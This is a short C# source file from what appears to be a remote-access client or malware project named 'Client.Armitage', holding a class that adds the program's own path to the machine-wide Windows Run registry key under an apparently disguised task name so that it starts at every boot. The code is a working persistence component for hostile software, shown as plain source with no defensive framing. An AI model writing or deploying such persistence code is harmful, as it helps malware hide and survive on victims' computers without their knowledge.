using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Armitage.Startup
{
    /// <summary>
    /// requires admin
    /// </summary>
    public static class Via_Registry
    {
        private static RegistryKey RegistryStartupFolder =
            Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

        public static bool AddSelfToLocalMachine()
        {
            try
            {
                RegistryStartupFolder.SetValue(Constants.MMCTaskName,
                    $"\"{Constants.MyPath}\" system");
                RegistryStartupFolder.Flush();
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
            return false;
        }

    }
}
